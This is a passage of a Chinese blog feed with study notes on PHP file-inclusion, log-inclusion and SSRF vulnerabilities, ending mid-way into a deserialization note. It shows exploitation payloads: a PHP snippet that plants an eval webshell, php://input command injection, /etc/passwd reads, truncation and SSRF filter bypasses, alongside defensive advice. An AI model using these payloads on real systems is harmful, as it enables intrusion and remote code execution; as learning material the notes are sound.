    <content type="html"><![CDATA[<p>关于文件包含漏洞，我觉得和ssrf漏洞有点儿像，ssrf漏洞是通过curl()函数获取信息但是没有进行过滤，从而访问到内网造成危害，文件包含漏洞则是通过include()函数获取文件，攻击者输入敏感文件导致敏感文件也被输出从而产生危害。</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为包含。</p><p>为了使代码更加灵活，通常会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><p>PHP中提供了四种文件包含函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()<span class="hljs-comment">//只有程序执行到include()函数时，才包含文件，发生错误代码也继续向下执行</span><br><br><span class="hljs-keyword">include_once</span>()<span class="hljs-comment">//与include()相同，但是重复调用同一个文件时，程序只调用一次</span><br><br><span class="hljs-keyword">require</span>()<span class="hljs-comment">//与include()区别在于包含文件如果发生错误，程序则终止执行</span><br><br><span class="hljs-keyword">require_once</span>()<span class="hljs-comment">//与include_once和include的区别相同</span><br></code></pre></td></tr></table></figure><h1 id="文件包含类型"><a href="#文件包含类型" class="headerlink" title="文件包含类型"></a>文件包含类型</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><pre><code>当本地存在敏感文件时，包含本地的文件，就是本地文件包含(就是字面意思)例如下面有一个含有文件包含的PHP文件</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error&quot;</span>;&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>而就在相同目录下有这样一个3.txt文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>phpinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们在url上输入?file=3.txt<br><img src="https://img-blog.csdnimg.cn/c1438a33fde3428b81c28061554556b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>就读取到了该文件的内容，需要注意的时，虽然我们读取的文件时txt文件，但是include的函数会先用php解析一遍(哪怕是jpg,png也不例外)，如果可以运行那么就当作php文件输出，如果不行就直接输出文本，</p><p>像这类情况通常是出现在有文件上传功能的网页中，当用户上传了图片，或者是文本时，当用户需要读取该文件时，假如服务器后端没有对GET获取的file过滤，那么就有可能造成用户任意读取文件。</p><h3 id="有限制的本地文件包含漏洞绕过"><a href="#有限制的本地文件包含漏洞绕过" class="headerlink" title="有限制的本地文件包含漏洞绕过"></a>有限制的本地文件包含漏洞绕过</h3><p>假如服务器在后端进行了过滤，常用的绕过方法有%00截断，路劲长度截断文件包含，点号阶段文件包含</p><ol><li><p>%00截断<br>当服务器在后端会默认给你文件添加后缀时，%00是结束符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.html&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当以上这种情况，文件名为%00可以讲后面的.html截断(00截断的使用条件是PHP版本低于5.3且php.ini中magic_quotes_gpc=off)</p></li><li><p>路径长度截断文件包含(./和.截断)<br>操作系统存在最大路径长度的限制。可以输入超过最大路径长度的目录，这样系统就会将后面的路径丢弃，导致扩展名截断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/test.php?filename=1.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span><br><br>执行完成后成功截断后面的.html扩展名，包含了<span class="hljs-number">1</span>.txt文件<br></code></pre></td></tr></table></figure></li></ol><p>大概意思意思就是在文件名后面加若干个./，目录名有一个最大长度，当目录名超过这个最大长度，超过部分就不会被系统读取。</p><p>weindows下目录最大路劲为256B、linux为4096B<br>也就是在版本低于5.3的情况下，Windows下连续240个点（.）或者(./)可以截断，Linux下连续2038个/.可以截断。</p><ol start="3"><li>远程包含的?截断<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=_GET[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;.php&#x27;</span>);<br></code></pre></td></tr></table></figure>在上面这段代码中，我们在testrfi.com主机的Web目录下创建phpinfo.txt，提交请求127.0.0.1/test.php?url=phpinfo.txt?后发现返回了主机的phpinfo信息。这是因为服务器解析的内容为127.0.0.1/test.php?url=phpinfo.txt?.php，它把?后面的内容作为了参数，因此实现了截断。<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2>远程文件包含首先需要在php.ini中开启下面的配置<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span> //把<span class="hljs-literal">Off</span>改成<span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure></li></ol><p>简单来说，就是服务器通过include()函数，包含了别的网页的某个目录的文件</p><p>例如我在url上输入 ?file=192.168.0.2/web/.1.txt</p><p>最后就会输出1.txt文件，这里也不多演示了，原理很简单。</p><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><p>上文我们说了可以访问别的网站目录下的文件，利用这一点，我们可以做一个一句话shell<br>简单理解就是运行的其他网页的代码内容是：在当前目录创建一个1.php文件，文件内容<?php @eval($_POST['shell']?></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;shell&#x27;])?&gt;&quot;</span><br><span class="hljs-variable">$myfile</span>=fopen(<span class="hljs-string">&quot;1.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file&quot;</span>);<br>fwrite(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$payload</span>);<br>fclose(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>之后就可以通过蚁剑连接了</p><h3 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h3><p>指当进行远程文件包含时遇到过滤或者是添加扩展名<br><strong>漏洞代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>     <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>.”.html”);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li>?绕过<br>?filename=<a href="http://192.168.1.110/xiaohua.txt">http://192.168.1.110/xiaohua.txt</a>?</li><li>#绕过<br>?filename=<a href="http://192.168.1.110/xiaohua.txt%23(#%E5%8F%B7%E8%A6%81%E7%BC%96%E7%A0%81)">http://192.168.1.110/xiaohua.txt%23(#号要编码)</a></li><li>空格绕过<br>?filename=<a href="http://192.168.1.110/xiaohua.txt%20(%20%E6%98%AF%E7%A9%BA%E6%A0%BC%E7%9A%84url%E7%BC%96%E7%A0%81)">http://192.168.1.110/xiaohua.txt%20(%20是空格的url编码)</a></li></ol><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>php伪协议不陌生了，在ssrf漏洞中也有用到<br>php自带了很多url风格的封装协议，在文件包含时也可以利用这些伪协议</p><p><img src="https://img-blog.csdnimg.cn/9e80d5f8c2d34f25894ad0395c231510.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_10,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php://伪协议"></a>php://伪协议</h2><p>首先伪协议运行是有条件的，在php.ini中下面两个配置必许是On状态</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_include=on<br><br>allow_url_fopen=on <br></code></pre></td></tr></table></figure><p><strong>1、php://fiter</strong><br>使用方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">(1):filename=php://filter/read=convert.base64-encode/resource=xx.php<br>(2):filename=php://filter/convert.base64-encode/resource=xxx.php<br></code></pre></td></tr></table></figure><p>read=convert.base64-encode的意思是把文件base64编码后输出文件，主要是防止文件中有类似于//这种注释，或者不能显现出来的字符，直接输出base64编码就能全部把文件代码显示出来。</p><p><strong>2、php://input</strong><br>我的理解是php://input伪协议可以把文件上传的POST数据当作php代码使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?file=php://input<br></code></pre></td></tr></table></figure><p>例如我们在POST中输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;dir&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>页面就会返回当前目录所有的目录文件</p><p>也可以像远程文件包含那样注入shell</p><p><strong>3、file://</strong><br>可以访问本地文件系统，读取文件内容<br>使用方法:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://localhost/file.php?filename=file://C:\phpStudy\PHPTutorial\WWW\xiaohua.txt<br></code></pre></td></tr></table></figure><p>这个协议可以任意内网中的文件，在ssrf漏洞中也有用到</p><p><strong>4、data://</strong><br>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码<br>使用方法:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">data://text/plain;base64,xxxx(base64编码后的数据)<br></code></pre></td></tr></table></figure><h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ol><li><p>进行文件过滤，尽量采用白名单的方法，安全度更高</p></li><li><p>修改php.ini配置文件，关闭不必要的协议</p></li><li><p>本地目录不要放不安全的文件，防止被本地文件包含 </p></li><li><p>路径限制，一定要禁止目录跳转符，例如/./ 或者是..等等</p></li></ol><p>学习参考:<br><a href="https://www.cnblogs.com/xhds/p/12216170.html">文件包含漏洞1</a></p><p><a href="https://www.cnblogs.com/richardlee97/p/10542057.html">文件包含漏洞2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssrf日志包含漏洞</title>
    <link href="/2021/09/16/%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/09/16/%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>日志包含漏洞也是ssrf的一种吧，同样服务器没有很好的过滤，或者是服务器配置不当导致用户进入了内网</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先需要开启服务器记录日志功能</p><p>在不同的系统，存放日志文件地方和文件名不同<br>apache一般是/var/log/apache/access.log</p><p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p><p>由于访问URL时访问URL时，服务器会对其编码，所以得通过抓包的形式尝试注入</p><h2 id="实际运用"><a href="#实际运用" class="headerlink" title="实际运用"></a>实际运用</h2><p>先通过/etc/passwd判断是否存在ssrf漏洞<br>因为不管是什么系统，都会在etc目录下存放passwd文件</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">?<span class="hljs-built_in">url</span>=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p>如果成功访问说明是可以访问内网文件, 那么就可以通过这种方式访问日志文件了</p><p><img src="https://img-blog.csdnimg.cn/c2610454f1f0420f9cbb3bf2188fd795.png" alt="在这里插入图片描述"></p><p>先访问日志文件，发现是nginx服务器，并且看到存储的是客户端的User-Agent信息<br><img src="https://img-blog.csdnimg.cn/b497954a3a094865997c7d8a69baddb7.png" alt="在这里插入图片描述">接着只要在User-Agent处注入就好了</p><p><img src="https://img-blog.csdnimg.cn/15dc69325fa54dbe8b6e397eade292aa.png" alt="在这里插入图片描述"><br>成功地达到了注入地效果</p><p><img src="https://img-blog.csdnimg.cn/ae401dbe696440cb9031a0a30bccb019.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在ctf中要想找flag的话把phpinfo()换成一句话木马就好了</p>]]></content>
    
    
    
    <tags>
      
      <tag>SSRF</tag>
      
      <tag>特殊姿势</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析ssrf漏洞</title>
    <link href="/2021/09/13/sssrf%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/09/13/sssrf%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>在一个web系统中，内网存放着一些重要的文件以及资源，这些资源往往不能被公开，否则就造成安全问题<br>ssrf漏洞就是通过服务器请求伪造访问内网文件的一种漏洞</p><span id="more"></span><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)</p><p>　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>我的理解是，正常情况下，我们无法访问内网，或者说无法向内网发送报文，但是ssrf是通过服务器访问内网，由于服务器属于内部系统，那么内网就不会拒绝服务器的请求，从而达到一个访问内网的目的。</p><p>正常我们发送请求的过程:<br>客户端—–&gt;服务器(未过滤)——&gt;目标 地址</p><p>可以看到，最后发送目标地址的报文是由服务器发出的，倘若服务器对客户端的url不加以过滤处理，就可能造成srrf漏洞</p><h2 id="二、ssrf漏洞实例"><a href="#二、ssrf漏洞实例" class="headerlink" title="二、ssrf漏洞实例"></a>二、ssrf漏洞实例</h2><p>理解一个漏洞的最快方法就是通过实例取了解它</p><p>这里有一个网站，它希望我们通过GET输入其他的网站，从而跳转到我们输入的网页<br><img src="https://img-blog.csdnimg.cn/2621ee63d25d4fd187f17ee341dbf330.png" alt="在这里插入图片描述">如果我们输入<a href="http://www.baidu.com,那我们就来到了百度的页面/">www.baidu.com,那我们就来到了百度的页面</a><br><img src="https://img-blog.csdnimg.cn/9c8b36dc8a34456bbe73fe46256a3775.png" alt="在这里插入图片描述"><br>倘若我不按规矩走，输入它内网的地址以及文件既127.0.0.1/flag.php,就有可能访问到flag.php里面的内容</p><p><img src="https://img-blog.csdnimg.cn/f418d35520c24506a21e5f55c121c726.png" alt="在这里插入图片描述">这就是一个简单的ssrf漏洞例子</p><p>产生漏洞后，产生的危害有<br>任意访问内网的文件<br>DOS攻击(请求大文件，始终保持连接占用服务器资源)<br>攻击web应用等</p><h2 id="三、ssrf漏洞产生原因"><a href="#三、ssrf漏洞产生原因" class="headerlink" title="三、ssrf漏洞产生原因"></a>三、ssrf漏洞产生原因</h2><p>这里有一个网上大佬总结的ssrf漏洞的图，总结的很详细</p><p><img src="https://img-blog.csdnimg.cn/a532e103d37f4c76a73e9eaaf00dc154.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>主要谈一下利用方式，主要就是这四种协议</p><p>首先这是我搭建的一个网页，它的想法是希望我们输入一个url，从而跳转到那个网页</p><p><img src="https://img-blog.csdnimg.cn/5722b4c908324151b3c2d10b9328e6d7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>下面是后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;  <br>    <span class="hljs-variable">$ch</span> = curl_init();<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    curl_exec(<span class="hljs-variable">$ch</span>);<br>    curl_close(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>curl(<span class="hljs-variable">$url</span>); <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>curl()可以利用的协议有很多 file,duct,gopher都可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=file:<span class="hljs-comment">//127.0.0.1/1.txt</span><br>file协议可以用来读取任意文件<br><br>?url=dict:<span class="hljs-comment">//127.0.0.1:8081</span><br>dict协议可以查看端口开放情况(可以结合BP爆破端口号)<br><br>?gopher:<span class="hljs-comment">//&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</span><br>gopher协议可以反弹shell，也就是通过服务器向内网发送报文<br><br></code></pre></td></tr></table></figure><p>使用dict爆破端口<br><img src="https://img-blog.csdnimg.cn/b8226fdaf6904bb6ba71cb43e47493c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA54Gr54Gr54Gr5LiO6ZyN6ZyN,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过gopher协议向内网的其他flag.php传送POST数据(甚至可以通过POST上传图片码等文件)<br><img src="https://img-blog.csdnimg.cn/a5d26b7e4d674b7db7320b525430e9b1.png" alt="在这里插入图片描述"></p><p>在gopher协议中，由于是服务器通过curl向内网发生报文，我们需要对gopher-path内容进行两次编码<br>因为报文内容会在客户端的url上解码一次，服务器通过curl发送报文时解码一次，共两次</p><p>同时还要注意编码过程中换行符%0A要全部替换成%0D%0A,其原因时在linux系统里面换行符的url编码是%0A，而windos是%0D0A，国内大部分在线编码器都是转换成%0A</p><p><strong>注意</strong><br>以上的方法全部都是伪协议<br>伪协议成立的条件还是下面两个函数必须是打开状态，以及版本大于7.3.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_include=On<br>allow_url_fopen=On<br></code></pre></td></tr></table></figure><p>关于渗透的方式这里有一个大佬写的非常好，甚至很多我都不会，看来仍需学习，链接放这儿了<a href="https://blog.csdn.net/u012206617/article/details/108941738">ssrf渗透方法</a></p><h2 id="常见的过滤与绕过"><a href="#常见的过滤与绕过" class="headerlink" title="常见的过滤与绕过"></a>常见的过滤与绕过</h2><p>常见的过滤</p><ol><li> 过滤开头不是<a href="http://xxx.com的所有链接/">http://xxx.com的所有链接</a></li><li>过滤格式为ip的链接，比如127.0.0.1</li><li> 结尾必须是某个后缀</li></ol><p>绕过方法</p><ol><li>http基础认证(加上@)<br>也就是url格式改成<a href="http://abc.com@127.0.0.1(等同于/?127.0.0.1)">http://abc.com@127.0.0.1(等同于/?127.0.0.1)</a></li><li>使用短链接<br>短链接指向的地址就是内网地址</li><li>更改为其他进制的ip<br>IP地址转换成十进制：</li><li>0.0.1=2130706433</li></ol><h2 id="关于ssrf漏洞可能出现的场景"><a href="#关于ssrf漏洞可能出现的场景" class="headerlink" title="关于ssrf漏洞可能出现的场景"></a>关于ssrf漏洞可能出现的场景</h2><ol><li>首先就是通过url分享网页，也就是这篇笔记中我开头说的例子，这里就不多做解释了</li><li>图片下载与加载<br>一个页面，上面有很多图片，而这些图片可能是保存在他们本地服务器的图片，然后在网页上调用，这样是安全的。<br>同时还有另一种情况就是，程序员为了偷懒，或者是节省空间，在网上借用图片是不是下载在本地，而是直接把图片连接地址放上去，这种方法就有可能是有ssrf漏洞的<br>例如下面这种就是可能存在ssrf漏洞的加载<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.douban.com<span class="hljs-regexp">/***/</span>service?image=http:<span class="hljs-regexp">//</span>www.baidu.com<span class="hljs-regexp">/img/</span>bd_logo1.png<br></code></pre></td></tr></table></figure></li><li>在线翻译<br> 通过url地址翻译文本内容可能存在ssrf漏洞</li></ol><h2 id="ssrf漏洞的防范"><a href="#ssrf漏洞的防范" class="headerlink" title="ssrf漏洞的防范"></a>ssrf漏洞的防范</h2><p>一、首先就是要对获取url进行一个过滤，过滤掉内网ip，最好是设置一个白名单</p><p>二、对进制不需要的协议，仅允许http和https请求</p><p>三、禁止302跳转,或每跳转一次检查新的host是否为内网ip,后禁止</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = curl_init();<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">True</span>);<br>    <span class="hljs-comment">// 限制为HTTPS、HTTP协议</span><br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);<br>    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    curl_exec(<span class="hljs-variable">$ch</span>);<br>    curl_close(<span class="hljs-variable">$ch</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>curl(<span class="hljs-variable">$url</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>以上代码就对各种伪协议加上了限制，同时设置跳转重定向为True(也就是默认不跳转)</p><p>四、限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等</p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP漏洞</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化漏洞</title>
    <link href="/2021/08/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/08/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>本篇主要是介绍什么是序列化漏洞，对序列化漏洞有个最初的了解。</p><span id="more"></span><h2 id="序列化的概念"><a href="#序列化的概念" class="headerlink" title="序列化的概念"></a>序列化的概念</h2><p>当一个对象需要跨文件传递时，或者说为了更加节省空间，通常会对这个对象进行序列化操作，序列化的好处就是将这个对象变成了数据流</p><p>serialize()就是将对象转换为序列化的函数，而unserialize()就是将被序列化的对象重新转换为序列化，通过这样的方式，就可以达到节省空间并且跨文件传递</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;User &#x27;.<span class="hljs-subst">$this</span>-&gt;name.&#x27; is &#x27;.<span class="hljs-subst">$this</span>-&gt;age.&#x27; years old.&lt;br /&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$P</span> =<span class="hljs-keyword">new</span> People();<br><span class="hljs-variable">$P</span>-&gt;age=<span class="hljs-number">18</span>;<br><span class="hljs-variable">$P</span>-&gt;name=<span class="hljs-string">&#x27;zhangsan&#x27;</span>;<br><span class="hljs-variable">$P</span>-&gt;printdata();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$P</span>)<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//a.php</span><br></code></pre></td></tr></table></figure><p>在a.php中，有一个People的对象里面是他的两个变量，在经过赋值以及输出变量后进行了序列化操作，最后页面的输出是这样的<br><img src="https://img-blog.csdnimg.cn/c856ce9bd3bc49879e144e24dfc841e7.png" 